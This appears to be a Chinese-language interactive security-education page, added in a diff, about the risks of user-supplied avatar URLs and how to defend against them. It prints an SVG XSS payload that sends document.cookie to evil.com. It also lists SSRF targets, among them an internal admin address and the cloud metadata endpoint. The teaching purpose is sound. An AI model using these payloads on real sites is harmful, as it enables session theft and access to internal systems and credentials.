@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>头像URL陷阱：一张图片如何出卖你 | 数字直觉</title>
+  <script src="../../components/header.js" defer></script>
+  <link rel="stylesheet" href="../../components/header.css">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="container">
+
+  <div class="header">
+    <h1><i class="ti ti-photo-shield"></i> 头像 URL 陷阱</h1>
+    <p>允许用户填写外部图片地址作为头像，看起来很方便。但每个浏览你主页的人，都可能在不知情中向攻击者的服务器发送了一个请求。</p>
+  </div>
+
+  <!-- ── Step 1: 实时追踪演示 ── -->
+  <div class="section">
+    <div class="step-badge">实验 1</div>
+    <h2><i class="ti ti-target"></i> 追踪像素：一张1x1的图片能拿到什么</h2>
+    <p class="section-hint">点击下方按钮，模拟一个论坛帖子加载了攻击者设置的头像URL。观察攻击者服务器收到了哪些信息。</p>
+    <div class="demo-area">
+      <div class="forum-mock">
+        <div class="forum-post">
+          <div class="post-avatar" id="avatarSlot">
+            <div class="avatar-placeholder"><i class="ti ti-user"></i></div>
+          </div>
+          <div class="post-content">
+            <div class="post-author">黑客小明</div>
+            <div class="post-text">大家好，我是新来的，请多关照~</div>
+            <div class="post-meta">发布于 2 分钟前</div>
+          </div>
+        </div>
+      </div>
+      <button class="btn btn-primary" id="loadAvatarBtn" onclick="loadTrackingAvatar()">
+        <i class="ti ti-photo-down"></i> 加载该用户的外部头像
+      </button>
+    </div>
+
+    <!-- 攻击者日志面板 -->
+    <div class="spy-panel hidden" id="spyPanel">
+      <div class="spy-header">
+        <span class="blink-dot"></span>
+        <span>攻击者服务器日志 — 收到请求</span>
+      </div>
+      <div class="spy-log" id="spyLog"></div>
+    </div>
+  </div>
+
+  <!-- ── Step 2: SSRF 演示 ── -->
+  <div class="section">
+    <div class="step-badge">实验 2</div>
+    <h2><i class="ti ti-server-bolt"></i> SSRF：让服务器替你探路</h2>
+    <p class="section-hint">如果网站后端会主动抓取头像URL做缓存或校验，攻击者可以让服务器去请求内网地址。选一个「头像地址」看看后端会怎样。</p>
+    <div class="ssrf-cards" id="ssrfCards">
+      <div class="ssrf-card" onclick="simulateSsrf('normal')">
+        <div class="ssrf-icon safe"><i class="ti ti-photo"></i></div>
+        <div class="ssrf-label">正常图片</div>
+        <code>https://cdn.example.com/avatar.jpg</code>
+      </div>
+      <div class="ssrf-card" onclick="simulateSsrf('internal')">
+        <div class="ssrf-icon danger"><i class="ti ti-server"></i></div>
+        <div class="ssrf-label">内网探测</div>
+        <code>http://192.168.1.1/admin</code>
+      </div>
+      <div class="ssrf-card" onclick="simulateSsrf('metadata')">
+        <div class="ssrf-icon danger"><i class="ti ti-cloud"></i></div>
+        <div class="ssrf-label">云元数据</div>
+        <code>http://169.254.169.254/latest/meta-data/</code>
+      </div>
+      <div class="ssrf-card" onclick="simulateSsrf('redirect')">
+        <div class="ssrf-icon warning"><i class="ti ti-arrows-right"></i></div>
+        <div class="ssrf-label">重定向绕过</div>
+        <code>https://evil.com/redirect→内网</code>
+      </div>
+    </div>
+    <div class="ssrf-result hidden" id="ssrfResult"></div>
+  </div>
+
+  <!-- ── Step 3: SVG XSS ── -->
+  <div class="section">
+    <div class="step-badge">实验 3</div>
+    <h2><i class="ti ti-code"></i> SVG 注入：图片里藏代码</h2>
+    <p class="section-hint">SVG 是合法的图片格式，但它本质上是 XML，可以内嵌 JavaScript。如果网站允许引用 .svg 作为头像，攻击者可以注入脚本。</p>
+    <div class="svg-demo">
+      <div class="code-block">
+        <div class="code-label"><i class="ti ti-file-type-svg"></i> 恶意 SVG 文件内容</div>
+        <pre><code id="svgCode">&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;circle cx="50" cy="50" r="50" fill="red"/&gt;
+  &lt;script&gt;
+    // 窃取当前页面 Cookie
+    new Image().src = 'https://evil.com/steal?c='
+      + document.cookie;
+  &lt;/script&gt;
+&lt;/svg&gt;</code></pre>
+      </div>
+      <div class="svg-comparison">
+        <div class="svg-safe">
+          <h4><i class="ti ti-shield-check"></i> img 标签加载（安全）</h4>
+          <p>浏览器将 SVG 当作图片渲染，<strong>不执行内嵌脚本</strong>。</p>
+          <div class="verdict safe">脚本被沙箱隔离</div>
+        </div>
+        <div class="svg-danger">
+          <h4><i class="ti ti-alert-triangle"></i> 直接嵌入/object/embed（危险）</h4>
+          <p>SVG 内脚本<strong>可以执行</strong>，拥有当前页面权限。</p>
+          <div class="verdict danger">XSS 攻击成功</div>
+        </div>
+      </div>
+      <button class="btn btn-primary" onclick="demonstrateSvg()">
+        <i class="ti ti-player-play"></i> 模拟两种加载方式
+      </button>
+      <div class="svg-result hidden" id="svgResult"></div>
+    </div>
+  </div>
+
+  <!-- ── Step 4: 大文件 DoS ── -->
+  <div class="section">
+    <div class="step-badge">实验 4</div>
+    <h2><i class="ti ti-bomb"></i> 资源耗尽：一张「图片」拖垮页面</h2>
+    <p class="section-hint">攻击者把头像URL指向一个超大文件或永不结束的流。看看对浏览器和服务器分别造成什么影响。</p>
+    <div class="dos-scenarios">
+      <div class="dos-card" id="dosCard1" onclick="simulateDos('large')">
+        <div class="dos-icon"><i class="ti ti-file-filled"></i></div>
+        <h4>500MB「图片」</h4>
+        <p>浏览器持续下载，内存飙升，页面卡顿</p>
+      </div>
+      <div class="dos-card" id="dosCard2" onclick="simulateDos('slow')">
+        <div class="dos-icon"><i class="ti ti-hourglass"></i></div>
+        <h4>慢速响应</h4>
+        <p>1 字节/秒，占用连接池，拖垮后端并发</p>
+      </div>
+      <div class="dos-card" id="dosCard3" onclick="simulateDos('zip')">
+        <div class="dos-icon"><i class="ti ti-file-zip"></i></div>
+        <h4>压缩炸弹</h4>
+        <p>10KB 压缩包解压后 10GB，耗尽服务器内存</p>
+      </div>
+    </div>
+    <div class="dos-meter hidden" id="dosMeter">
+      <div class="meter-label">模拟资源消耗</div>
+      <div class="meter-bar"><div class="meter-fill" id="dosFill"></div></div>
+      <div class="meter-value" id="dosValue">0%</div>
+    </div>
+  </div>
+
+  <!-- ── Step 5: 防御方案对比 ── -->
+  <div class="section">
+    <h2><i class="ti ti-shield-checkered"></i> 防御方案对比</h2>
+    <p class="section-hint">点击每种方案查看详细说明，评估实施成本和防护效果。</p>
+    <div class="defense-grid" id="defenseGrid">
+      <div class="defense-card" data-level="3" onclick="showDefense(0)">
+        <div class="defense-level high">强</div>
+        <h4>服务端代理 + 存储</h4>
+        <p>下载图片到自己的 CDN，只提供内部 URL</p>
+      </div>
+      <div class="defense-card" data-level="2" onclick="showDefense(1)">
+        <div class="defense-level medium">中</div>
+        <h4>CSP 白名单</h4>
+        <p>Content-Security-Policy 限制 img-src 来源</p>
+      </div>
+      <div class="defense-card" data-level="2" onclick="showDefense(2)">
+        <div class="defense-level medium">中</div>
+        <h4>URL 校验 + 白名单域名</h4>
+        <p>只允许已知安全的图床域名</p>
+      </div>
+      <div class="defense-card" data-level="1" onclick="showDefense(3)">
+        <div class="defense-level low">弱</div>
+        <h4>仅校验文件后缀</h4>
+        <p>检查 .jpg/.png 后缀（极易绕过）</p>
+      </div>
+    </div>
+    <div class="defense-detail hidden" id="defenseDetail"></div>
+  </div>
+
+  <!-- ── 风险总结 ── -->
+  <div class="section">
+    <h2><i class="ti ti-list-check"></i> 风险矩阵</h2>
+    <div class="risk-matrix">
+      <table class="risk-table">
+        <thead>
+          <tr><th>攻击方式</th><th>危害等级</th><th>利用难度</th><th>影响范围</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>IP/行为追踪</td><td><span class="badge high">高</span></td><td><span class="badge easy">极低</span></td><td>所有查看者</td></tr>
+          <tr><td>SSRF 内网探测</td><td><span class="badge critical">严重</span></td><td><span class="badge medium">中等</span></td><td>服务器</td></tr>
+          <tr><td>SVG XSS</td><td><span class="badge high">高</span></td><td><span class="badge easy">低</span></td><td>查看者浏览器</td></tr>
+          <tr><td>CSRF 请求伪造</td><td><span class="badge medium">中</span></td><td><span class="badge easy">低</span></td><td>已登录用户</td></tr>
+          <tr><td>资源耗尽 DoS</td><td><span class="badge medium">中</span></td><td><span class="badge easy">极低</span></td><td>服务器/浏览器</td></tr>
+          <tr><td>Referrer 泄露</td><td><span class="badge low">低</span></td><td><span class="badge easy">极低</span></td><td>所有查看者</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ── 原理卡片 ── -->
+  <div class="section">
+    <h2><i class="ti ti-brain"></i> 为什么「图片 URL」这么危险？</h2>
+    <div class="principle-grid">
+      <div class="principle-card">
+        <div class="num">01</div>
+        <h4>img 请求不受同源策略限制</h4>
+        <p>浏览器加载图片时自动发送 GET 请求到任意域名，携带 Referer 头，无需用户授权。</p>
+      </div>
+      <div class="principle-card">
+        <div class="num">02</div>
+        <h4>请求由查看者的浏览器发出</h4>
+        <p>攻击者的服务器能拿到每个查看帖子的人的 IP、User-Agent、访问时间——精确到秒。</p>
+      </div>
+      <div class="principle-card">
+        <div class="num">03</div>
+        <h4>服务端抓取 = 开放代理</h4>
+        <p>如果后端主动 fetch 用户提供的URL，等于给了攻击者一个可以探测内网的代理服务器。</p>
+      </div>
+      <div class="principle-card">
+        <div class="num">04</div>
+        <h4>SVG 是披着图片外衣的 HTML</h4>
+        <p>SVG 支持 script、foreignObject 等元素。用错加载方式就是打开了 XSS 的大门。</p>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script src="app.js"></script>
+</body>
+</html>
